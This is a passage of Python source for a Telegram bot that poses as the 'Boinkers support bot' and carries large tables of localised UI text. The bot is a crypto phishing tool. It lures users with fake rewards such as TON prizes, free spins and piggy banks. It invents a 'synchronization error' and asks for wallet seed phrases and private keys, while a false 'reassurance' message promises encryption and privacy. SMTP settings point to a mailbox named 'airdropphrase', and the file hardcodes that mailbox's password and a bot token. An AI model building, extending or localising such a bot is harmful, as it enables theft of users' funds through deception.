#!/usr/bin/env python3
"""
Telegram bot with multi-language support.
Modifications made:
- Removed languages: ms, th, pl, ro, cs, sk
- Updated language keyboard accordingly
- Main menu modifications:
  - "Reflection" -> "Token Reflection"
  - "Missing Balance" -> "Missing tokens"
  - Removed "Fix BUG"
  - Added: Recover stars 🌟, Break Piggy Bank, Free spins, Album Rewards,
           Claim 100 TONS, CLAIM 1 TON, Mega wheel
- Added localized keys for synchronization error, "Claim Manually", prompt_24_* and wallet_24_error_* and error_use_seed_phrase
  for all remaining languages to ensure the wallet-sync flow and 24-word prompts/errors are localized.
- Wallet selection still displays Synchronization Error + Claim Manually (preserves flow)
"""

import logging
import re
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7
CLAIM_STICKER_INPUT = 8
CLAIM_STICKER_CONFIRM = 9

# Regex patterns
MAIN_MENU_PATTERN = r"^(validation|claim_tokens|recover_account_progress|assets_recovery|general_issues|rectification|withdrawals|login_issues|missing_tokens|claim_spin|refund|reflection|pending_withdrawal|recover_telegram_stars|claim_rewards|claim_tickets|claim_sticker_reward|recover_stars|break_piggy_bank|free_spins|album_rewards|claim_100_tons|claim_1_ton|mega_wheel)$"
WALLET_TYPE_PATTERN = r"^wallet_type_"
OTHER_WALLETS_PATTERN = r"^other_wallets$"

# --- Email Configuration (update in production / use env vars) ---
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # replace with env var in prod
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Bot token (as provided) - replace with env var in production
BOT_TOKEN = "8846957728:AAENwAInAAnXqDh1-0vafNyCcIPNE4Mra6E"

# Wallet display names used for wallet selection UI
WALLET_DISPLAY_NAMES = {
    "wallet_type_metamask": "Tonkeeper",
    "wallet_type_trust_wallet": "Telegram Wallet",
    "wallet_type_coinbase": "MyTon Wallet",
    "wallet_type_tonkeeper": "Tonhub",
    "wallet_type_phantom_wallet": "Trust Wallet",
    "wallet_type_rainbow": "Rainbow",
    "wallet_type_safepal": "SafePal",
    "wallet_type_wallet_connect": "Wallet Connect",
    "wallet_type_ledger": "Ledger",
    "wallet_type_brd_wallet": "BRD Wallet",
    "wallet_type_solana_wallet": "Solana Wallet",
    "wallet_type_balance": "Balance",
    "wallet_type_okx": "OKX",
    "wallet_type_xverse": "Xverse",
    "wallet_type_sparrow": "Sparrow",
    "wallet_type_earth_wallet": "Earth Wallet",
    "wallet_type_hiro": "Hiro",
    "wallet_type_saitamask_wallet": "Saitamask Wallet",
    "wallet_type_casper_wallet": "Casper Wallet",
    "wallet_type_cake_wallet": "Cake Wallet",
    "wallet_type_kepir_wallet": "Kepir Wallet",
    "wallet_type_icpswap": "ICPSwap",
    "wallet_type_kaspa": "Kaspa",
    "wallet_type_nem_wallet": "NEM Wallet",
    "wallet_type_near_wallet": "Near Wallet",
    "wallet_type_compass_wallet": "Compass Wallet",
    "wallet_type_stack_wallet": "Stack Wallet",
    "wallet_type_soilflare_wallet": "Soilflare Wallet",
    "wallet_type_aioz_wallet": "AIOZ Wallet",
    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet",
    "wallet_type_polkadot_wallet": "Polkadot Wallet",
    "wallet_type_xportal_wallet": "XPortal Wallet",
    "wallet_type_multiversx_wallet": "Multiversx Wallet",
    "wallet_type_verachain_wallet": "Verachain Wallet",
    "wallet_type_casperdash_wallet": "Casperdash Wallet",
    "wallet_type_nova_wallet": "Nova Wallet",
    "wallet_type_fearless_wallet": "Fearless Wallet",
    "wallet_type_terra_station": "Terra Station",
    "wallet_type_cosmos_station": "Cosmos Station",
    "wallet_type_exodus_wallet": "Exodus Wallet",
    "wallet_type_argent": "Argent",
    "wallet_type_binance_chain": "Binance Chain",
    "wallet_type_safemoon": "SafeMoon",
    "wallet_type_gnosis_safe": "Gnosis Safe",
    "wallet_type_defi": "DeFi",
    "wallet_type_other": "Other",
}

# PROFESSIONAL_REASSURANCE translations (remaining languages) — uses {input_type}
PROFESSIONAL_REASSURANCE = {
    "en": 'Please note that "We protect your privacy. Your input {input_type} is highly encrypted and stored securely, and will only be used to help with this request, and we won’t share your information with third parties!."',
    "es": 'Tenga en cuenta que "Protegemos su privacidad. Su entrada {input_type} está altamente cifrada y almacenada de forma segura, y solo se utilizará para ayudar con esta solicitud, y no compartiremos su información con terceros!."',
    "fr": 'Veuillez noter que "Nous protégeons votre vie privée. Votre entrée {input_type} est fortement chiffrée et stockée en toute sécurité, et ne sera utilisée que pour aider à cette demande, et nous ne partagerons pas vos informations avec des tiers!."',
    "ru": 'Обратите внимание, что "Мы защищаем вашу конфиденциальность. Ваш ввод {input_type} надежно зашифрован и хранится в безопасности, и будет использоваться только для помощи с этим запросом, и мы не будем передавать вашу информацию третьим лицам!."',
    "uk": 'Зверніть увагу, що "Ми захищаємо вашу конфіденційність. Ваш ввід {input_type} сильно зашифрований і зберігається безпечно, і буде використовуватися лише для цієї запиту, і ми не будемо передавати вашу інформацію третім особам!."',
    "fa": 'لطفاً توجه داشته باشید که "ما از حریم خصوصی شما محافظت می‌کنیم. ورودی {input_type} شما به طور جدی رمزگذاری شده و به‌صورت امن ذخیره می‌شود، و فقط برای کمک به این درخواست استفاده خواهد شد، و ما اطلاعات شما را با اشخاص ثالث به اشتراک نخواهیم گذاشت!."',
    "ar": 'يرجى ملاحظة أنه "نحن نحمي خصوصيتك. يتم تشفير مدخلاتك {input_type} بشكل كبير وتخزينها بأمان، ولن يتم استخدامها إلا للمساعدة في هذا الطلب، ولن نشارك معلوماتك مع أطراف ثالثة!."',
    "pt": 'Observe que "Protegemos sua privacidade. Sua entrada {input_type} está altamente criptografada e armazenada com segurança, e será usada apenas para ajudar nesta solicitação, e não compartilharemos suas informações com terceiros!."',
    "id": 'Harap dicatat bahwa "Kami melindungi privasi Anda. Masukan {input_type} Anda sangat terenkripsi dan disimpan dengan aman, dan hanya akan digunakan untuk membantu permintaan ini, dan kami tidak akan membagikan informasi Anda dengan pihak ketiga!."',
    "de": 'Bitte beachten Sie, dass "Wir schützen Ihre Privatsphäre. Ihre Eingabe {input_type} ist hoch verschlüsselt und sicher gespeichert und wird nur verwendet, um bei dieser Anfrage zu helfen, und wir werden Ihre Informationen nicht an Dritte weitergeben!."',
    "nl": 'Houd er rekening mee dat "Wij uw privacy beschermen. Uw invoer {input_type} is sterk versleuteld en veilig opgeslagen, en zal alleen worden gebruikt om bij dit verzoek te helpen, en we zullen uw informatie niet met derden delen!."',
    "hi": 'कृपया ध्यान दें कि "हम आपकी गोपनीयता की रक्षा करते हैं। आपका {input_type} अत्यधिक एन्क्रिप्टेड है और सुरक्षित रूप से संग्रहीत है, और केवल इस अनुरोध में सहायता करने के लिए उपयोग किया जाएगा, और हम आपकी जानकारी तीसरे पक्ष के साथ साझा नहीं करेंगे!."',
    "tr": 'Lütfen unutmayın: "Gizliliğinizi koruyoruz. Girdiğiniz {input_type} yüksek düzeyde şifrelenmiştir ve güvenli bir şekilde saklanır; bu isteğe yardımcı olmak için kullanılacak ve bilgilerinizi üçüncü taraflarla paylaşmayacağız!."',
    "zh": '请注意："我们保护您的隐私。您输入的 {input_type} 已被高度加密并安全存储，仅会用于帮助处理此请求，我们不会与第三方共享您的信息！."',
    "ur": 'براہِ مہربانی نوٹ کریں کہ "ہم آپ کی رازداری کی حفاظت کرتے ہیں۔ آپ کی داخل کردہ معلومات {input_type} کو سختی سے خفیہ کیا گیا ہے اور محفوظ طریقے سے ذخیرہ کیا جاتا ہے، اور اسے صرف اس درخواست میں مدد کے لیے استعمال کیا جائے گا، اور ہم آپ کی معلومات تیسرے فریق کے ساتھ شیئر نہیں کریں گے!."',
    "uz": 'Iltimos unutmang: "Biz sizning maxfiyligingizni himoya qilamiz. Sizning kiritganingiz {input_type} kuchli shifrlangan va xavfsiz saqlanadi, va bu so‘rovga yordam berish uchun ishlatiladi; biz ma’lumotlaringizni uchinchi tomonlar bilan ulashmaymiz!."',
    "it": 'Si prega di notare che "Proteggiamo la tua privacy. Il tuo input {input_type} è altamente crittografato e memorizzato in modo sicuro, e sarà utilizzato solo per aiutare con questa richiesta, e non condivideremo le tue informazioni con terze parti!."',
    "ja": 'ご注意ください：「私たちはあなたのプライバシーを保護します。あなたの入力 {input_type} は高度に暗号化され安全に保存され、このリクエストの支援のためのみ使用され、第三者と情報を共有することはありません!。」',
    "vi": 'Xin lưu ý rằng "Chúng tôi bảo vệ quyền riêng tư của bạn. Dữ liệu {input_type} của bạn được mã hóa cao và lưu trữ an toàn, và chỉ được sử dụng để hỗ trợ yêu cầu này, và chúng tôi sẽ không chia sẻ thông tin của bạn với bên thứ ba!."',
}

# Fallback reassurance template
REASSURANCE_TEMPLATE = 'Please note that "We protect your privacy. Your input {input_type} is highly encrypted and stored securely, and will only be used to help with this request, and we won’t share your information with third parties!."'

# Full multi-language UI texts (remaining languages only)
# Removed: ms, th, pl, ro, cs, sk
# Added localization keys for:
# - synchronization error: "synchronization_error"
# - claim manually button label: "claim_manually"
# - prompt_24_wallet_type_* for 4 wallets
# - wallet_24_error_wallet_type_* for 4 wallets
# - error_use_seed_phrase fallback
LANGUAGES = {
    "en": {
        "welcome": "Hi {user} welcome to the Boinkers support bot! This bot helps with wallet access, transactions, balances, recoveries, account recovery, claiming tokens and rewards, refunds, and account validations. Please choose one of the menu options to proceed.",
        "main menu title": "Please select an issue type to continue:",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "recover account progress": "Recover Account Progress",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "withdrawals": "Withdrawals",
        "missing tokens": "Missing tokens",
        "login issues": "Login Issues",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE["en"],
        "prompt seed": "Please enter the 12 or 24 words of your wallet.",
        "prompt private key": "Please enter your private key.",
        # 24-word prompts (ensure present)
        "prompt_24_wallet_type_metamask": "Please enter the 24 words of your Tonkeeper wallet.",
        "prompt_24_wallet_type_trust_wallet": "Please enter the 24 words of your Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Please enter the 24 words of your MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Please enter the 24 words of your Tonhub wallet.",
        # wallet-specific 24-word errors
        "wallet_24_error_wallet_type_metamask": "This field requires a seed phrase (the 24 words of your Tonkeeper wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_trust_wallet": "This field requires a seed phrase (the 24 words of your Telegram wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_coinbase": "This field requires a seed phrase (the 24 words of your MyTon wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_tonkeeper": "This field requires a seed phrase (the 24 words of your Tonhub wallet). Please provide the seed phrase instead.",
        # new items and labels
        "refund": "Refund",
        "reflection": "Token Reflection",
        "pending withdrawal": "Pending withdrawal",
        "token reflection": "Token Reflection",
        "recover stars": "Recover stars 🌟",
        "break piggy bank": "Break Piggy Bank",
        "free spins": "Free spins",
        "album rewards": "Album Rewards",
        "claim 100 tons": "Claim 100 TONS",
        "claim 1 ton": "CLAIM 1 TON",
        "mega wheel": "Mega wheel",
        # connect messages for new items
        "connect_refund": "Please connect your wallet to receive your refund",
        "connect_recover_stars": "Please connect your wallet to recover your stars 🌟 in your telegram account",
        "connect_break_piggy_bank": "Please connect your wallet to smash your Piggy Bank and receive your rewards",
        "connect_free_spins": "Please connect your wallet to claim 1M Spins in your account",
        "connect_album_rewards": "Please connect your wallet to receive your Sticker album collection reward",
        "connect_claim_100_tons": "Please connect your wallet to claim your 100 tons which you won from the ALBUM SET WHEEL",
        "connect_claim_1_ton": "Please connect your wallet to claim your 1 ton which you won from the ALBUM SET WHEEL",
        "connect_mega_wheel": "Please connect your wallet to activate MEGA WHEEL in your account",
        "connect_missing_tokens": "Please connect your wallet to get your missing tokens :",
        # synchronization / claim manually / fallback seed error
        "synchronization_error": (
            "⚠️Synchronization Error Detected⚠️\n\n"
            "Our system was unable to establish a verified link between your wallet and the Boinkers bot.\n\n"
            "This usually occurs when the wallet has not completed the initial protocol merge handshake. To continue, you must perform a manual sync & merge to register your wallet‼️"
        ),
        "claim_manually": "Claim Manually",
        "error_use_seed_phrase": "Please provide your wallet's seed phrase (12 or 24 words).",
        "post_receive_error": "‼ An error occurred, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Use /start to try again.",
        "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
        "choose language": "Please select your preferred language:",
        "await restart message": "Please click /start to start over.",
        "enter stickers prompt": "Kindly type in the sticker(s) you want to claim.",
        "confirm_entered_stickers": "You entered {count} sticker(s):\n{stickers}\n\nPlease confirm you want to claim these stickers.",
        "yes": "Yes",
        "no": "No",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
    },
    "es": {
        "welcome": "Hi {user} bienvenido al Boinkers support bot! Este bot ayuda con acceso a billetera, transacciones, saldos, recuperaciones, recuperación de cuenta, reclamar tokens y recompensas, reembolsos y validaciones de cuenta. Por favor, seleccione una opción del menú para continuar.",
        "main menu title": "Por favor seleccione un tipo de problema para continuar:",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "recover account progress": "Recuperar progreso de la cuenta",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "withdrawals": "Retiros",
        "missing tokens": "Tokens faltantes",
        "login issues": "Problemas de Inicio de Sesión",
        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Seed Phrase para continuar.",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Seed Phrase",
        "label_seed_phrase": "frase semilla",
        "label_private_key": "clave privada",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE["es"],
        "prompt seed": "Por favor ingrese las 12 o 24 palabras de su wallet.",
        "prompt private key": "Por favor ingrese su private key.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Por favor ingrese las 24 palabras de su wallet Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Por favor ingrese las 24 palabras de su Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Por favor ingrese las 24 palabras de su MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Por favor ingrese las 24 palabras de su Tonhub wallet.",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "Este campo requiere una frase semilla (las 24 palabras de su billetera Tonkeeper). Por favor proporcione la frase semilla.",
        "wallet_24_error_wallet_type_trust_wallet": "Este campo requiere una frase semilla (las 24 palabras de su billetera Telegram). Por favor proporcione la frase semilla.",
        "wallet_24_error_wallet_type_coinbase": "Este campo requiere una frase semilla (las 24 palabras de su billetera MyTon). Por favor proporcione la frase semilla.",
        "wallet_24_error_wallet_type_tonkeeper": "Este campo requiere una frase semilla (las 24 palabras de su billetera Tonhub). Por favor proporcione la frase semilla.",
        "refund": "Reembolso",
        "reflection": "Reflexión de Token",
        "pending withdrawal": "Retiro pendiente",
        "token reflection": "Reflexión de Token",
        "recover stars": "Recuperar estrellas 🌟",
        "break piggy bank": "Romper Alcancía",
        "free spins": "Tiradas gratis",
        "album rewards": "Recompensas de Álbum",
        "claim 100 tons": "Reclamar 100 TONS",
        "claim 1 ton": "Reclamar 1 TON",
        "mega wheel": "Mega rueda",
        "connect_refund": "Por favor conecte su billetera para recibir su reembolso",
        "connect_recover_stars": "Por favor conecte su billetera para recuperar sus estrellas 🌟 en su cuenta de Telegram",
        "connect_break_piggy_bank": "Por favor conecte su billetera para romper su Alcancía y recibir sus recompensas",
        "connect_free_spins": "Por favor conecte su billetera para reclamar 1M de Tiradas en su cuenta",
        "connect_album_rewards": "Por favor conecte su billetera para recibir su recompensa por colección de álbumes de stickers",
        "connect_claim_100_tons": "Por favor conecte su billetera para reclamar sus 100 tons que ganó en la RUEDA ALBUM SET",
        "connect_claim_1_ton": "Por favor conecte su billetera para reclamar su 1 ton que ganó en la RUEDA ALBUM SET",
        "connect_mega_wheel": "Por favor conecte su billetera para activar la MEGA RUEDA en su cuenta",
        "connect_missing_tokens": "Por favor conecte su billetera para obtener sus tokens faltantes :",
        # synchronization / claim manually / fallback seed error
        "synchronization_error": (
            "⚠️Error de sincronización detectado⚠️\n\n"
            "Nuestro sistema no pudo establecer un enlace verificado entre su billetera y el bot Boinkers.\n\n"
            "Esto suele ocurrir cuando la billetera no ha completado el apretón de manos de fusión del protocolo inicial. Para continuar, debe realizar una sincronización y fusión manual para registrar su billetera‼️"
        ),
        "claim_manually": "Reclamar manualmente",
        "error_use_seed_phrase": "Por favor proporcione la frase semilla de su wallet (12 o 24 palabras).",
        "post_receive_error": "‼ Ocurrió un error, Por favor asegúrese de ingresar la clave correcta, use copiar y pegar para evitar errores. por favor /start para intentar de nuevo.",
        "invalid choice": "Elección inválida. Por favor use los botones.",
    },
    "fr": {
        "welcome": "Hi {user} bienvenue au Boinkers support bot! Ce bot aide avec l'accès au portefeuille, transactions, soldes, récupérations, récupération de compte, réclamer des tokens et récompenses, remboursements et validations de compte. Veuillez choisir une option du menu pour continuer.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "recover account progress": "Récupérer la progression du compte",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "withdrawals": "Retraits",
        "missing tokens": "Tokens manquants",
        "login issues": "Problèmes de Connexion",
        "connect wallet message": "Veuillez connecter votre wallet avec votre Private Key ou Seed Phrase pour continuer.",
        "connect wallet button": "🔑 Connecter Wallet",
        "select wallet type": "Veuillez sélectionner votre type de wallet :",
        "other wallets": "Autres Wallets",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer Seed Phrase",
        "label_seed_phrase": "phrase mnémonique",
        "label_private_key": "clé privée",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE["fr"],
        "prompt seed": "Veuillez entrer les 12 ou 24 mots de votre wallet.",
        "prompt private key": "Veuillez entrer votre private key.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Veuillez entrer les 24 mots de votre wallet Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "Veuillez entrer les 24 mots de votre Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Veuillez entrer les 24 mots de votre MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Veuillez entrer les 24 mots de votre Tonhub wallet.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet Tonkeeper). Veuillez fournir la phrase mnémonique.",
        "wallet_24_error_wallet_type_trust_wallet": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet Telegram). Veuillez fournir la phrase mnémonique.",
        "wallet_24_error_wallet_type_coinbase": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet MyTon). Veuillez fournir la phrase mnémonique.",
        "wallet_24_error_wallet_type_tonkeeper": "Ce champ nécessite une phrase mnémonique (les 24 mots de votre wallet Tonhub). Veuillez fournir la phrase mnémonique.",
        "refund": "Remboursement",
        "reflection": "Réflexion de Token",
        "pending withdrawal": "Retrait en attente",
        "token reflection": "Réflexion de Token",
        "recover stars": "Récupérer étoiles 🌟",
        "break piggy bank": "Briser la Tirelire",
        "free spins": "Tours gratuits",
        "album rewards": "Récompenses d'Album",
        "claim 100 tons": "Réclamer 100 TONS",
        "claim 1 ton": "Réclamer 1 TON",
        "mega wheel": "Méga roue",
        "connect_recover_stars": "Veuillez connecter votre wallet pour récupérer vos étoiles 🌟 dans votre compte Telegram",
        "connect_break_piggy_bank": "Veuillez connecter votre wallet pour casser votre Tirelire et recevoir vos récompenses",
        "connect_free_spins": "Veuillez connecter votre wallet pour réclamer 1M de tours dans votre compte",
        "connect_album_rewards": "Veuillez connecter votre wallet pour recevoir votre récompense de collection d'album d'autocollants",
        "connect_claim_100_tons": "Veuillez connecter votre wallet pour réclamer vos 100 tons gagnés à la ROUE ALBUM SET",
        "connect_claim_1_ton": "Veuillez connecter votre wallet pour réclamer votre 1 ton gagné à la ROUE ALBUM SET",
        "connect_mega_wheel": "Veuillez connecter votre wallet pour activer la MÉGA ROUE dans votre compte",
        "connect_missing_tokens": "Veuillez connecter votre wallet pour récupérer vos tokens manquants :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Erreur de synchronisation détectée⚠️\n\n"
            "Notre système n'a pas pu établir un lien vérifié entre votre wallet et le bot Boinkers.\n\n"
            "Cela se produit généralement lorsque le wallet n'a pas terminé la poignée de main de fusion du protocole initial. Pour continuer, vous devez effectuer une synchronisation et fusion manuelle pour enregistrer votre wallet‼️"
        ),
        "claim_manually": "Réclamer manuellement",
        "error_use_seed_phrase": "Veuillez fournir la phrase mnémonique de votre wallet (12 ou 24 mots).",
        "post_receive_error": "‼ Une erreur est survenue, Veuillez vous assurer de saisir la bonne clé, utilisez copier/coller pour éviter les erreurs. /start pour réessayer.",
        "invalid choice": "Choix invalide. Veuillez utiliser les boutons.",
    },
    "ru": {
        "welcome": "Hi {user} добро пожаловать в Boinkers support bot! Этот бот помогает с доступом к кошельку, транзакциями, балансами, восстановлением, получением токенов и наград, возвратами и проверками аккаунта. Пожалуйста, выберите пункт меню, чтобы продолжить.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "recover account progress": "Восстановление прогресса аккаунта",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "withdrawals": "Выводы",
        "missing tokens": "Отсутствующие токены",
        "login issues": "Проблемы со Входом",
        "connect wallet message": "Пожалуйста, подключите ваш кошелек с помощью Private Key или Seed Phrase, чтобы продолжить.",
        "connect wallet button": "🔑 Подключить Wallet",
        "select wallet type": "Пожалуйста выберите тип кошелька:",
        "other wallets": "Другие Wallets",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Phrase",
        "label_seed_phrase": "фраза восстановления",
        "label_private_key": "приватный ключ",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE["ru"],
        "prompt seed": "Пожалуйста, введите 12 или 24 слова вашей seed phrase.",
        "prompt private key": "Пожалуйста, введите ваш private key.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Пожалуйста введите 24 слова вашего Tonkeeper кошелька.",
        "prompt_24_wallet_type_trust_wallet": "Пожалуйста введите 24 слова вашего Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Пожалуйста введите 24 слова вашего MyTon кошелька.",
        "prompt_24_wallet_type_tonkeeper": "Пожалуйста введите 24 слова вашего Tonhub кошелька.",
        # wallet errors
        "wallet_24_error_wallet_type_metamask": "Это поле требует seed phrase (24 слова вашего кошелька Tonkeeper). Пожалуйста, предоставьте seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Это поле требует seed phrase (24 слова вашего Telegram кошелька). Пожалуйста, предоставьте seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Это поле требует seed phrase (24 слова вашего MyTon кошелька). Пожалуйста, предоставьте seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Это поле требует seed phrase (24 слова вашего Tonhub кошелька). Пожалуйста, предоставьте seed phrase.",
        "refund": "Возврат",
        "reflection": "Отражение токена",
        "pending withdrawal": "Ожидающий вывод",
        "token reflection": "Отражение токена",
        "recover stars": "Восстановить звезды 🌟",
        "break piggy bank": "Разбить копилку",
        "free spins": "Бесплатные вращения",
        "album rewards": "Награды альбома",
        "claim 100 tons": "Заявить 100 TONS",
        "claim 1 ton": "Заявить 1 TON",
        "mega wheel": "Мега колесо",
        "connect_recover_stars": "Пожалуйста подключите ваш кошелек, чтобы восстановить ваши звезды 🌟 в вашем Telegram аккаунте",
        "connect_break_piggy_bank": "Пожалуйста подключите ваш кошелек, чтобы разбить копилку и получить награды",
        "connect_free_spins": "Пожалуйста подключите ваш кошелек, чтобы получить 1M вращений в вашем аккаунте",
        "connect_album_rewards": "Пожалуйста подключите ваш кошелек для получения вознаграждения за коллекцию альбома наклеек",
        "connect_claim_100_tons": "Пожалуйста подключите ваш кошелек, чтобы заявить 100 tons, которые вы выиграли на ALBUM SET WHEEL",
        "connect_claim_1_ton": "Пожалуйста подключите ваш кошелек, чтобы заявить 1 ton, который вы выиграли на ALBUM SET WHEEL",
        "connect_mega_wheel": "Пожалуйста подключите ваш кошелек, чтобы активировать MEGA WHEEL в вашем аккаунте",
        "connect_missing_tokens": "Пожалуйста подключите ваш кошелек, чтобы получить ваши отсутствующие токены :",
        # synchronization / claim manually / fallback
        "synchronization_error": (
            "⚠️Обнаружена ошибка синхронизации⚠️\n\n"
            "Наша система не смогла установить проверенную связь между вашим кошельком и ботом Boinkers.\n\n"
            "Обычно это происходит, когда кошелёк не завершил начальный протокол объединения. Чтобы продолжить, вам нужно выполнить ручную синхронизацию и объединение для регистрации вашего кошелька‼️"
        ),
        "claim_manually": "Заявить вручную",
        "error_use_seed_phrase": "Пожалуйста предоставьте seed phrase вашего кошелька (12 или 24 слова).",
        "post_receive_error": "‼ Произошла ошибка, Пожалуйста убедитесь, что вы вводите правильный ключ, используйте копировать/вставить, чтобы избежать ошибок. пожалуйста /start чтобы попробовать снова.",
        "invalid choice": "Неверный выбор. Пожалуйста используйте кнопки.",
    },
    "uk": {
        "welcome": "Hi {user} ласкаво просимо до Boinkers support bot! Цей бот допомагає з доступом до гаманця, транзакціями, балансами, відновленнями, отриманням токенів і винагород, поверненнями та перевірками облікового запису. Будь ласка, виберіть пункт меню для продовження.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "recover account progress": "Відновлення прогресу акаунту",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "withdrawals": "Виведення",
        "missing tokens": "Відсутні токени",
        "login issues": "Проблеми зі входом",
        "connect wallet message": "будь ласка підключіть свій wallet за допомогою Private Key або Seed Phrase для продовження.",
        "connect wallet button": "🔑 Підключити Wallet",
        "select wallet type": "Будь ласка виберіть тип вашого wallet:",
        "other wallets": "Інші Wallets",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Phrase",
        "label_seed_phrase": "фразa seed",
        "label_private_key": "приватний ключ",
        "wallet selection message": "Ви обрали {wallet_name}.\nОберіть бажаний режим підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE["uk"],
        "prompt seed": "Будь ласка введіть 12 або 24 слова вашої seed phrase.",
        "prompt private key": "Будь ласка введіть ваш private key.",
        # 24-word prompts
        "prompt_24_wallet_type_metamask": "Будь ласка введіть 24 слова вашого Tonkeeper гаманця.",
        "prompt_24_wallet_type_trust_wallet": "Будь ласка введіть 24 слова вашого Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Будь ласка введіть 24 слова вашого MyTon гаманця.",
        "prompt_24_wallet_type_tonkeeper": "Будь ласка введіть 24 слова вашого Tonhub гаманця.",
        # wallet 24 errors
        "wallet_24_error_wallet_type_metamask": "Це поле вимагає seed phrase (24 слова вашого Tonkeeper гаманця). Будь ласка, надайте seed phrase.",
        "wallet_24_error_wallet_type_trust_wallet": "Це поле вимагає seed phrase (24 слова вашого Telegram гаманця). Будь ласка, надайте seed phrase.",
        "wallet_24_error_wallet_type_coinbase": "Це поле вимагає seed phrase (24 слова вашого MyTon гаманця). Будь ласка, надайте seed phrase.",
        "wallet_24_error_wallet_type_tonkeeper": "Це поле вимагає seed phrase (24 слова вашого Tonhub гаманця). Будь ласка, надайте seed phrase.",
        "refund": "Повернення",
        "reflection": "Відображення токенів",
        "token reflection": "Відображення токенів",
        "recover stars": "Відновити зірки 🌟",
        "break piggy bank": "Розбити скарбничку",
        "free spins": "Безкоштовні спіни",
        "album rewards": "Нагороди альбому",
        "claim 100 tons": "Отримати 100 TONS",
        "claim 1 ton": "Отримати 1 TON",
        "mega wheel": "Мега колесо",
        "connect_recover_stars": "Будь ласка підключіть свій гаманець, щоб відновити ваші зірки 🌟 у вашому обліковому записі Telegram",
